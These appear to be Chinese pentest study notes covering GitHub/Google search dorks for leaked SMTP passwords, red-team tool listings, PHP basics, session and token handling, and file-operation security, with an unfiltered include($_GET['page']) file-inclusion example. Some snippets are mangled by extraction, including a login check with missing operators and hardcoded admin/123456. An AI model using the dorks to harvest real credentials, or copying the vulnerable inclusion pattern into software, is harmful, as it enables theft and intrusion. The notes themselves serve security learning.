in:file\n\n\nGithub资源搜索\n\n1234567891011121314in:name test               #仓库标题搜索含有关键字in:descripton test         #仓库描述搜索含有关键字in:readme test             #Readme文件搜素含有关键字stars:&gt;3000 test           #stars数量大于3000的搜索关键字stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键forks:&gt;1000 test           #forks数量大于1000的搜索关键字 forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字 size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字user:test                  #用户名搜素 license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字 language:java test         #在java语言的代码中搜索关键字 user:test in:name test     #组合搜索,用户名test的标题含有test的\n\n\n关键字配合谷歌搜索\n\n1234567site:Github.com smtpsite:Github.com smtp @qq.com site:Github.com smtp @126.comsite:Github.com smtp @163.com site:Github.com smtp @sina.com.cn site:Github.com smtp password site:Github.com String password smtp\n\n\n语法固定长期后续监控新泄露\n基于关键字监控\n基于项目规则监控\nhttps://github.com/madneal/gshark\nhttps://github.com/NHPT/FireEyeGoldCrystal\nhttps://github.com/Explorer1092/Github-Monitor\n\n\n\n2.网盘资源搜索-全局文件机密\n主要就是查看网盘中是否存有目标的敏感文件\n如：企业招标，人员信息，业务产品，应用源码等\n\n3.敏感目录文件-目录扫描&amp;爬虫\n后续会写\n\n4.网络空间进阶-证书&amp;图标&amp;邮箱\n证书资产\nICO资产\n\nfofa、quake、hunter\n\n\n邮箱资产\n\nhttps://hunter.io/\n\n\n\n七、红蓝队工具1.各类红蓝队优秀工具项目集合\n项目地址：https://github.com/guchangan1/All-Defense-Tool\n本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大 CMS 利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。\n\n2.自动化-武器库部署-F8x\n项目地址：https://github.com/ffffffff0x/f8x\n\n介绍：一款红&#x2F;蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等\n\n配置：\n\n通过 CF Workers 下载 [推荐]\nwget : wget -O f8x https://f8x.io/\ncurl : curl -o f8x https://f8x.io/\n\n\n\n使用：见项目文档\n\n\n3.自动化-网络空间-Asamf\n项目地址：https://github.com/Kento-Sec/AsamF\n介绍：\nAsamF 集成了 Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF 支持 Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone 配置多个 Key。\n\n\n配置：\nAsamF 会在&#x2F;.config&#x2F;asamf&#x2F;目录下生成 config.json 文件。如果你有多个 key，按照 json 的格式录入即可，建议键值按照阿拉伯数字依次录入,方便以阿拉伯数字来切换 key。自动结果保存在&#x2F;asamf&#x2F;目录下。\n\n\n使用：见文档\n\n4.自动化-企查信息-ENScan\n项目地址：https://github.com/wgpsec/ENScan_GO\n介绍：剑指 HW&#x2F;SRC，解决在 HW&#x2F;SRC 场景下遇到的各种针对国内企业信息收集难题\n配置：ENScanGo 在第一次使用时需要使用-v 命令生成配置文件信息后进行配置\n使用：见项目文档\n\n5.综合自动化项目-nemo\n项目地址：https://github.com/hanc00l/nemo_go\n介绍：Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本。\n使用：见项目文档\n\n八、思维导图\n安全开发PHP开发一、PHP基础\n单引号：直接输出内容\n双引号：解释变量内容\n不加引号：执行内容输出结果\n\n引号对比12345678&lt;?php$a=4;$b=55;echo &#x27;$a+$b&#x27;.&quot;&lt;br&gt;&quot;;echo &quot;$a+$b&quot;.&quot;&lt;br&gt;&quot;;echo $a+$b.&quot;&lt;br&gt;&quot;;?&gt; $a+$b  4+55  59  \n\nPHP变量1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859函数外的变量为全局变量，函数内的变量为局部变量。函数内调用全局变量要用到global关键字。函数外不可以调用局部变量  &lt;?php$x=5;$y=10; function myTest()&#123;    global $x,$y;    $y=$x+$y;&#125; myTest();echo $y; // 输出 15?&gt;  PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。上面的实例可以写成这样：  &lt;?php$x=5;$y=10;function myTest()&#123;    $GLOBALS[&#x27;y&#x27;]=$GLOBALS[&#x27;x&#x27;]+$GLOBALS[&#x27;y&#x27;];&#125; myTest();echo $y;?&gt;  Static作用域：函数完成后值不会被删除  &lt;?phpfunction myTest()&#123;    static $x=0;    echo $x;    $x++;    echo PHP_EOL;    // 换行符&#125;myTest();myTest();myTest();?&gt;  参数作用域：传参\n\nPHP echo 和 print 语句12345678910111213141516171819202122232425262728293031323334&lt;?phpecho &quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;;echo &quot;Hello world!&lt;br&gt;&quot;;echo &quot;我要学 PHP!&lt;br&gt;&quot;;echo &quot;这是一个&quot;, &quot;字符串，&quot;, &quot;使用了&quot;, &quot;多个&quot;, &quot;参数。&quot;;$txt1=&quot;学习 PHP&quot;;$txt2=&quot;RUNOOB.COM&quot;;$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo &quot;$txt1&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;在 $txt2 学习 PHP &quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;\t$txt1=&quot;学习 PHP&quot;;$txt2=&quot;RUNOOB.COM&quot;;$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); print $txt1;print &quot;&lt;br&gt;&quot;;print &quot;在 $txt2 学习 PHP &quot;;print &quot;&lt;br&gt;&quot;;print &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;?&gt;  PHP 很有趣!Hello world!我要学 PHP!这是一个字符串，使用了多个参数。学习 PHP在 RUNOOB.COM 学习 PHP 我车的品牌是 Volvo学习 PHP在 RUNOOB.COM 学习 PHP 我车的品牌是 Volvo  \n\nPHP 数据类型12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php $x = 5985;var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = -345; // 负数 var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = 0x8C; // 十六进制数var_dump($x);echo &quot;&lt;br&gt;&quot;;$x = 047; // 八进制数var_dump($x);$x = 10.365;var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = 2.4e3;var_dump($x);echo &quot;&lt;br&gt;&quot;; $x = 8E-5;var_dump($x);$x=true;$y=false;$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);$c = mysql_connect();echo get_resource_type($c).&quot;\\n&quot;;// 打印：mysql link$fp = fopen(&quot;foo&quot;,&quot;w&quot;);echo get_resource_type($fp).&quot;\\n&quot;;// 打印：file$doc = new_xmldoc(&quot;1.0&quot;);echo get_resource_type($doc-&gt;doc).&quot;\\n&quot;;// 打印：domxml document?&gt;\n\nPHP类型比较\n虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较\n松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。\n严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。\n例如，”42” 是一个字符串而 42 是一个整数。FALSE 是一个布尔值而 “FALSE” 是一个字符串。\n\n\n\nPHP常量123456bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )&lt;?php// 不区分大小写的常量名define(&quot;GREETING&quot;, &quot;欢迎访问 Runoob.com&quot;, true);echo greeting;  // 输出 &quot;欢迎访问 Runoob.com&quot;?&gt;\n\nPHP字符串12345678910111213141516171819202122232425262728并置运算符（.）&lt;?php$txt1=&quot;Hello world!&quot;;$txt2=&quot;What a nice day!&quot;;echo $txt1 . &quot; &quot; . $txt2;?&gt;strlen() 函数：返回字符串长度。&lt;?phpecho strlen(&quot;Hello world!&quot;);?&gt;strpos()： 函数用于在字符串内查找一个字符或一段指定的文本。如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。下面的实例在字符串 &quot;Hello world!&quot; 中查找文本 &quot;world&quot;：&lt;?phpecho strpos(&quot;Hello world!&quot;,&quot;world&quot;);?&gt;  字符串中第一个字符的位置是 0，而不是 1。\n\n\n\n条件语句123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475if (条件)&#123;    条件成立时要执行的代码;&#125;if (条件)&#123;条件成立时执行的代码;&#125;else&#123;条件不成立时执行的代码;&#125;if (条件)&#123;    if 条件成立时执行的代码;&#125;elseif (条件)&#123;    elseif 条件成立时执行的代码;&#125;else&#123;    条件不成立时执行的代码;&#125;&lt;?phpswitch (n)&#123;case label1:    如果 n=label1，此处代码将执行;    break;case label2:    如果 n=label2，此处代码将执行;    break;default:    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;&#125;?&gt;\n\n数组12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758PHP 数值数组这里有两种创建数值数组的方法：自动分配 ID 键（ID 键总是从 0 开始）：$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);人工分配 ID 键：$cars[0]=&quot;Volvo&quot;;$cars[1]=&quot;BMW&quot;;$cars[2]=&quot;Toyota&quot;;下面的实例创建一个名为 $cars 的数值数组，并给数组分配三个元素,然后打印一段包含数组值的文本：实例&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;?&gt;获取数组的长度 - count() 函数count() 函数用于返回数组的长度（元素的数量）：实例&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo count($cars);?&gt;遍历数值数组遍历并打印数值数组中的所有值，您可以使用 for 循环，如下所示：实例&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);$arrlength=count($cars);for($x=0;$x&lt;$arrlength;$x++)&#123;    echo $cars[$x];    echo &quot;&lt;br&gt;&quot;;&#125;?&gt;PHP 关联数组关联数组是使用您分配给数组的指定的键的数组。这里有两种创建关联数组的方法：$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);or:$age[&#x27;Peter&#x27;]=&quot;35&quot;;$age[&#x27;Ben&#x27;]=&quot;37&quot;;$age[&#x27;Joe&#x27;]=&quot;43&quot;;随后可以在脚本中使用指定的键：实例&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);echo &quot;Peter is &quot; . $age[&#x27;Peter&#x27;] . &quot; years old.&quot;;?&gt;遍历关联数组遍历并打印关联数组中的所有值，您可以使用 foreach 循环，如下所示：实例&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);foreach($age as $x=&gt;$x_value)&#123;    echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value;    echo &quot;&lt;br&gt;&quot;;&#125;?&gt;\n\n数组排序\n数组中的元素可以按字母或数字顺序进行降序或升序排列。\n\n1234567PHP - 数组排序函数:sort() - 对数组进行升序排列rsort() - 对数组进行降序排列asort() - 根据关联数组的值，对数组进行升序排列ksort() - 根据关联数组的键，对数组进行升序排列arsort() - 根据关联数组的值，对数组进行降序排列krsort() - 根据关联数组的键，对数组进行降序排列\n\n超级全局变量123456789$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION\n\nPHP循环1234567891011121314151617181920212223242526272829303132333435363738394041424344454647while 循环：while 循环将重复执行代码块，直到指定的条件不成立。语法while (条件)&#123;    要执行的代码;&#125;do...while 语句：do...while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。语法do&#123;    要执行的代码;&#125;while (条件);for 循环：for 循环用于您预先知道脚本需要运行的次数的情况。语法for (初始值; 条件; 增量)&#123;    要执行的代码;&#125;参数：初始值：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。条件：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。增量：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。注释：上面的初始值和增量参数可为空，或者有多个表达式（用逗号分隔）。foreach 循环：foreach 循环用于遍历数组。语法foreach ($array as $value)&#123;    要执行代码;&#125;每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。foreach ($array as $key =&gt; $value)&#123;    要执行代码;&#125;每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。\n\nPHP函数\n如要在页面加载时执行脚本，您可以把它放到函数里。\n函数是通过调用函数来执行的。\n你可以在页面的任何位置调用函数。\nPHP 函数准则：\n函数的名称应该提示出它的功能\n函数名称以字母或下划线开头（不能以数字开头）\n\n\n\n123function functionName()&#123;// 要执行的代码&#125;\n\n\n函数（）里面可以传参数，($a,$b);如需让函数返回一个值，请在函数主体内使用 return 语句。\n\nPHP魔术常量123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130__LINE__文件中的当前行号。实例&lt;?phpecho &#x27;这是第 &quot; &#x27;  . __LINE__ . &#x27; &quot; 行&#x27;;?&gt;以上实例输出结果为：这是第 “ 2 ” 行__FILE__文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。实例:实例&lt;?phpecho &#x27;该文件位于 &quot; &#x27;  . __FILE__ . &#x27; &quot; &#x27;;?&gt;以上实例输出结果为：该文件位于 “ E:\\wamp\\www\\test\\index.php ”__DIR__文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(__FILE__)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0中新增）实例&lt;?phpecho &#x27;该文件位于 &quot; &#x27;  . __DIR__ . &#x27; &quot; &#x27;;?&gt;以上实例输出结果为：该文件位于 “ E:\\wamp\\www\\test ”__FUNCTION__函数名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。实例&lt;?phpfunction test() &#123;    echo  &#x27;函数名为：&#x27; . __FUNCTION__ ;&#125;test();?&gt;以上实例输出结果为：函数名为：test__CLASS__类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。类名包括其被声明的作用区域（例如 Foo\\Bar）。注意自 PHP 5.4 起 __CLASS__ 对 trait 也起作用。当用在 trait 方法中时，__CLASS__ 是调用 trait 方法的类的名字。实例&lt;?phpclass test &#123;    function _print() &#123;        echo &#x27;类名为：&#x27;  . __CLASS__ . &quot;&lt;br&gt;&quot;;        echo  &#x27;函数名为：&#x27; . __FUNCTION__ ;    &#125;&#125;$t = new test();$t-&gt;_print();?&gt;以上实例输出结果为：类名为：test函数名为：_print__TRAIT__Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4.0 起，PHP 实现了代码复用的一个方法，称为 traits。Trait 名包括其被声明的作用区域（例如 Foo\\Bar）。从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖。其行为 MyHelloWorld 类中定义的方法一致。优先顺序是当前类中的方法会覆盖 trait 方法，而 trait 方法又覆盖了基类中的方法。实例&lt;?phpclass Base &#123;    public function sayHello() &#123;        echo &#x27;Hello &#x27;;    &#125;&#125; trait SayWorld &#123;    public function sayHello() &#123;        parent::sayHello();        echo &#x27;World!&#x27;;    &#125;&#125; class MyHelloWorld extends Base &#123;    use SayWorld;&#125; $o = new MyHelloWorld();$o-&gt;sayHello();?&gt;以上例程会输出：Hello World!__METHOD__类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。实例:实例&lt;?phpfunction test() &#123;    echo  &#x27;函数名为：&#x27; . __METHOD__ ;&#125;test();?&gt;以上实例输出结果为：函数名为：test__NAMESPACE__当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）。实例:实例&lt;?phpnamespace MyProject; echo &#x27;命名空间为：&quot;&#x27;, __NAMESPACE__, &#x27;&quot;&#x27;; // 输出 &quot;MyProject&quot;?&gt;以上实例输出结果为：命名空间为：&quot;MyProject&quot;\n\nPHP命名空间（namespqce）\nPHP 命名空间(namespace)是在 PHP 5.3 中加入的，目的是解决重名问题，PHP中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。\nPHP 命名空间可以解决以下两类问题：\n用户编写的代码与PHP内部的类&#x2F;函数&#x2F;常量或第三方类&#x2F;函数&#x2F;常量之间的名字冲突。\n为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。\n\n\n\nPHP面向对象12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;?phpclass Site &#123;  /* 成员变量 */  var $url;  var $title;    /* 成员函数 */  function setUrl($par)&#123;     $this-&gt;url = $par;  &#125;    function getUrl()&#123;     echo $this-&gt;url . PHP_EOL;  &#125;    function setTitle($par)&#123;     $this-&gt;title = $par;  &#125;    function getTitle()&#123;     echo $this-&gt;title . PHP_EOL;  &#125;&#125;$runoob = new Site;$taobao = new Site;$google = new Site;// 调用成员函数，设置标题和URL$runoob-&gt;setTitle( &quot;菜鸟教程&quot; );$taobao-&gt;setTitle( &quot;淘宝&quot; );$google-&gt;setTitle( &quot;Google 搜索&quot; );$runoob-&gt;setUrl( &#x27;www.runoob.com&#x27; );$taobao-&gt;setUrl( &#x27;www.taobao.com&#x27; );$google-&gt;setUrl( &#x27;www.google.com&#x27; );// 调用成员函数，获取标题和URL$runoob-&gt;getTitle();$taobao-&gt;getTitle();$google-&gt;getTitle();$runoob-&gt;getUrl();$taobao-&gt;getUrl();$google-&gt;getUrl();?&gt;    &lt;?phpclass Site &#123;  /* 成员变量 */  var $url;  var $title;  function __construct( $par1, $par2 ) &#123;    $this-&gt;url = $par1;    $this-&gt;title = $par2;  &#125;  /* 成员函数 */  function setUrl($par)&#123;     $this-&gt;url = $par;  &#125;    function getUrl()&#123;     echo $this-&gt;url . PHP_EOL;  &#125;    function setTitle($par)&#123;     $this-&gt;title = $par;  &#125;    function getTitle()&#123;     echo $this-&gt;title . PHP_EOL;  &#125;&#125;$runoob = new Site(&#x27;www.runoob.com&#x27;, &#x27;菜鸟教程&#x27;);$taobao = new Site(&#x27;www.taobao.com&#x27;, &#x27;淘宝&#x27;);$google = new Site(&#x27;www.google.com&#x27;, &#x27;Google 搜索&#x27;);// 调用成员函数，获取标题和URL$runoob-&gt;getTitle();$taobao-&gt;getTitle();$google-&gt;getTitle();$runoob-&gt;getUrl();$taobao-&gt;getUrl();$google-&gt;getUrl();?&gt;\n\n\n\n二、PHP留言板功能&amp;超全局变量&amp;数据库操作\n\n开发环境：\nphpstrom：专业php开发ide\nphpstudy：Apache MYSQL环境\nNavicat：全能数据库管理工具\n\n\n\n数据库导入-mysql架构&amp;库表列\n1.数据库名，数据库表名，数据库列名\n2.数据库数据，格式类型，长度，键等\n\n数据库操作-mysql函数&amp;增删改查\nPHP函数：连接，选择，执行，结果，关闭等\n参考：https://www.runoob.com/php/php-ref-mysqli.html\n\n1234567891011常用：mysqli_connect() 打开一个到MySQL的新的连接。mysqli_select_db() 更改连接的默认数据库。mysqli_query() 执行某个针对数据库的查询。mysqli_fetch_row() 从结果集中取得一行，并作为枚举数组返回。mysqli_close() 关闭先前打开的数据库连接。MYSQL增删改查：查：select * from 表名 where 列名=&#x27;条件&#x27;;增：insert into 表名(`列名1`, `列名2`) value(&#x27;列1值1&#x27;, &#x27;列2值2&#x27;);删：delete from 表名 where 列名 = &#x27;条件&#x27;;改：update 表名 set 列名 = 数据 where 列名 = &#x27;条件&#x27;;\n\n数据库接受输出-html混编&amp;超全局变量\n1.html混编：使HTML（js）在php语言运行\n&lt;?php echo &#39;&lt;script&gt;alert(&#39;x&#39;);&lt;/script&gt;&#39; ?&gt;\n\n\n2.超全变量：\nhttps://www.w3school.com.cn/php/php_superglobals.asp\nhttps://www.php.net/manual/zh/language.variables.superglobals.php\n\n\n\n12345678$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量$_SERVER：这种超全局变量保存关于报头、路径和脚本位置的信息$_REQUEST：$_REQUEST 用于收集 HTML 表单提交的数据$_POST：广泛用于收集提交method=&quot;post&quot; 的HTML表单后的表单数据$_GET：收集URL中的发送的数据。也可用于收集提交HTML表单数据(method=&quot;get&quot;) $_FILES：文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容$_ENV：是一个包含服务器端环境变量的数组$_COOKIE：是一个关联数组，包含通过cookie传递给当前脚本的内容$_SESSION：是一个关联数组，包含当前脚本中的所有session内容\n\n第三方插件引用-js传参&amp;函数对象调用\n引用：&lt;script src = &#39;.xxx.js&gt;&lt;/script&gt;&#39;\n函数对象调用\n\n1234567891011121314151617181920var obj = &#123;    value : 0,increment : function (inc) &#123;        this.value += typeof inc === &#x27;number&#x27; ? inc :1;//设置inc且为数字时 value=inc 反之 value=1&#125;&#125;obj.increment();console.log(obj.value); //1obj.increment(2);console.log(obj.value); //2\n\n\n\n三、PHP应用&amp;后台模块&amp;Session&amp;Cookie&amp;Token&amp;身份验证&amp;唯一性身份验证-cookie使用\n生成cookie的原理过程：见图\n\n1.客户端向服务器发送HTTP请求\n2.服务器检查请求头中是否包含cookie信息\n3.如果请求头中包含cookie信息，则服务器使用该cookie来识别客户端，否则服务器将生成一个新的cookie\n4.服务器在响应头中设置cookie信息并将其发送回客户端\n5.客户端接收响应并将cookie保存在本地\n6.当客户端发送下一次HTTP请求时，它会将cookie信息附加到请求头中\n7.服务器收到请求并检查cookie的有效性\n8.如果cookie有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录\n\n12setcookie()  #设置一个cookie并发送到客户端浏览器unset()      #用于删除指定的cookie\n\n\n身份验证-Session使用\n1、客户端向服务器发送HTTP请求\n2、服务器为客户端生成一个唯一的session ID，并将其存储在服务器端的存储器中（如文件、数据库等）\n3、服务器将生成的session ID作为一个cookie发送给客户端。\n4、客户端将session ID保存为一个cookie，通常是在本地浏览器中存储\n5、当客户端在发送下一次HTTP请求时，它会将该cookie信息附加到请求头中，以便服务器可以通过该session ID来识别客户端\n6、服务器使用session ID来检索存储在服务器端存储器中的与该客户端相关的session数据，从而在客户端和服务器之间共享数据。\n\n12345session_start()    #启动会话，用于开始或恢复一个已经存在的会话$_SESSON           #用于存储和访问当前会话中的所有数据session_destroy()  #销毁当前会话中的所有数据session_unset()    #释放当前会话的所有变量Session存储路径：php.ini中session.save_path设置路径\n\n\n唯一性判断-Token使用\n1、生成Token并将其存储在Session\n2、生成Token并将其绑定在Cookie触发\n3、尝试登录表单中带入Token验证逻辑\n4、思考Token安全特性\n\n具体安全知识点Cookie和Session\nCookie和Session都是用来在Web应用程序中跟踪用户状态的机制\n\n1.存储位置不同：\n\nCookie是存储在客户端（浏览器）上的，而Session是存储在服务器端的。\n\n\n2.安全性不同：\n\nCookie存储在客户端上，可能会被黑客利用窃取信息，而Session存储在服务器上，更加安全。\n\n\n3.存储容量不同：\n\nCookie的存储容量有限，一般为4KB，而Session的存储容量理论上没有限制，取决于服务器的硬件和配置。\n\n\n4.生命周期不同：\n\nCookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而Session一般默认在浏览器关闭后就会过期。\n\n\n5.访问方式不同：\n\nCookie可以通过JavaScript访问，而Session只能在服务器端进行访问\n\n\n6.使用场景不同：\n\nCookie一般用于存储小型的数据，如用户的用户名和密码等信息。而Session一般用于存储大型的数据，如购物车、登录状态等信息\n\n\n总之，Cookie和Session都有各自的优缺点，选择使用哪一种方式，取决于具体的应用场景和需求。一般来说，如果需要存储敏感信息或者数据较大，建议使用Session；如果只需要存储少量的数据，并且需要在客户端进行访问，可以选择使用Cookie\n\n\nToken\n在Web应用程序中，使用token和不使用token的主要差异在于身份验证和安全性。\n1.身份验证：\n采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在每次请求时发送给服务器进行身份验证。而不采用token机制的Web应用程序，一般会使用session机制来保存用户登录状态，服务器会在用户登录成功后创建一个session，之后的每个请求都需要在HTTP头中附带这个session ID，以便服务器能够验证用户身份。\n\n\n2.安全性：\n采用token机制的Web应用程序，在服务器上不会存储用户的登录状态，只需要存储token即可。因此，即使token被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用token机制的Web应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。\n\n\n3.跨域访问：\n采用token机制的Web应用程序，在跨域访问时，可以使用HTTP头中的Authorization字段来传递token信息，方便实现跨域访问。而不采用token机制的Web应用程序，在跨域访问时，需使用cookie或session来传递用户身份信息，比较麻烦。\n\n\n总之，采用token机制可以提高Web应用程序的安全性，并且方便实现跨域访问。不过，使用token机制也需要开发者自己来实现身份验证和token的生成和验证，相对来说比较复杂。而不采用token机制，使用session机制则相对简单，但是安全性相对较低。因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。\n\n123456789101112131415161718&lt;?phpsession_start();$token = $_COOKIE[&#x27;token&#x27;] ?? &#x27;&#x27;;if ($token !== $_SESSION[&#x27;token&#x27;]) &#123;    // token不匹配，禁止访问    header(&#x27;HTTP/1.1 403 Forbidden&#x27;);    echo &#x27;Access denied&#x27;;    exit;&#125;else&#123;    if($_POST[&#x27;username&#x27;]&#x27;admin&#x27; &amp;&amp; $_POST[&#x27;password&#x27;]&#x27;123456&#x27;)&#123;        echo &#x27;登录成功!&#x27;;        echo &#x27;你是管理员可以访问文件管理页面！&#x27;;    &#125;else&#123;        echo &#x27;登录失败！&#x27;;    &#125;&#125;\n\n\n\n\n\n四、PHP应用&amp;文件管理模块&amp;显示上传&amp;黑白名单类型过滤&amp;访问控制文件管理模块-上传-过滤机制\n1.无过滤机制\n\n2.黑名单过滤机制\n\n3.白名单过滤机制\n\n4.文件类型过滤机制\n\n$_FILES：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。\n\n\n123456$_FILES[&quot;表单值&quot;][&quot;name&quot;] 获取上传文件原始名称$_FILES[&quot;表单值&quot;][&quot;type&quot;]获取上传文件MIME类型$_FILES[&quot;表单值&quot;][&quot;size&quot;] 获取上传文件字节单位大小$_FILES[&quot;表单值&quot;][&quot;tmp_name&quot;] 获取上传的临时副本文件名$_FILES[&quot;表单值&quot;][&quot;error&quot;] 获取上传时发生的错误代码move_uploaded_file() 将上传的文件移动到指定位置的函数\n\n\n\n文件管理模块-显示-过滤机制功能：显示 上传 下载 删除 编辑 包含等\n\n1.打开目录读取文件列表\n2.递归循环读取文件列表\n3.判断是文件还是文件夹\n4.PHP.INI目录访问控制\n\n123is_dir() 函数用于检查指定的路径是否是一个目录opendir() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录readdir() 函数用于从打开的目录句柄中读取目录中的文件和子目录\n\n\nopen_basedir：PHP.INI中的设置用来控制脚本程序访问目录（把：去掉就是控制在这个目录)\n过滤 切换目录负号：.  ..\\\n“”：代表目前所在的目录\n“ . “代表上一层目录\n“&#x2F;”：代表根目录。\n\n\nhttps://blog.csdn.net/Young__Fan/article/details/80152501\nhttps://blog.csdn.net/weixin_44567318/article/details/116863701\n\n五、PHP应用&amp;文件管理模块&amp;包含&amp;上传&amp;遍历&amp;写入&amp;删除&amp;下载&amp;安全PHP文件操作安全\n文件包含，文件上传，文件下载，文件删除，文件写入，文件遍历\n\n文件包含1234include()       #在错误发生后脚本继续执行require()       #在错误发生后脚本停止执行include_once()  #如果已经包含，则不再执行require_once()  #如果已经包含，则不再执行\n\n例：\n123include($_GET[&#x27;page&#x27;]);1.txt 内容: &lt;?php phpinfo();?&gt;x.php?page=phpinfo.php #触发文件包含漏洞，执行1.txt的代码\n\n\n\n文件上传\n无过滤机制、黑名单过滤机制、白名单过滤机制、文件类型过滤机制\n架构：\n1、上传至服务器本身的存储磁盘(源码在一起)\n2、云产品OSS存储对象去存储文件(泄漏安全)\n3、把文件上传到其他域名,如：upload.xiaodi8.com\">www.xiaodi8.com-&gt;upload.xiaodi8.com\n\n\n\n文件删除\nunlink() 文件删除函数\n调用命令删除：system shell_exex exec\n\n文件下载\n修改HTTP头实现文件读取解析下载\n\n1234header(&quot;Content-Type: application/octet-stream&quot;);header(&quot;Content-Disposition: attachment; 